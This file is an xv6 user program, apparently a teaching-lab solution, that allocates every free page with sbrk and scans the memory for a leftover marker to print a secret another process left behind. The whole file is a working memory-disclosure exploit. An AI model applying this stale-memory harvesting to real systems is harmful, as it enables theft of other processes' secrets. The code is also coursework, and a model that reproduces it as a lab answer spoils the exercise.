#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGSIZE 4096
#define MAXPAGES 4096   // far more than xv6's physical memory, so sbrk fails before this

int
main(int argc, char *argv[])
{
  char *base = sbrk(0);   // remember where our new memory starts
  int npages = 0;
  char *marker = "Here it is: ";
  int mlen = strlen(marker);

  // Grab every free page we can, one at a time, to sweep as much
  // of the free list as possible before other allocations reuse
  // and zero the physical page that used to hold the secret.
  while (npages < MAXPAGES) {
    char *p = sbrk(PGSIZE);
    if (p == (char *)-1)
      break;
    npages++;
  }

  uint64 total = (uint64)npages * PGSIZE;

  for (uint64 i = 0; i + mlen <= total; i++) {
    int match = 1;
    for (int k = 0; k < mlen; k++) {
      if (base[i + k] != marker[k]) {
        match = 0;
        break;
      }
    }
    if (match) {
      char *secret = base + i + mlen;
      for (int j = 0; secret[j] != '\0'; j++) {
        char c = secret[j];
        int isalnum = (c >= '0' && c <= '9') ||
                      (c >= 'a' && c <= 'z') ||
                      (c >= 'A' && c <= 'Z');
        if (!isalnum) break;
        printf("%c", c);
      }
      printf("\n");
      exit(0);
    }
  }

  exit(1);
}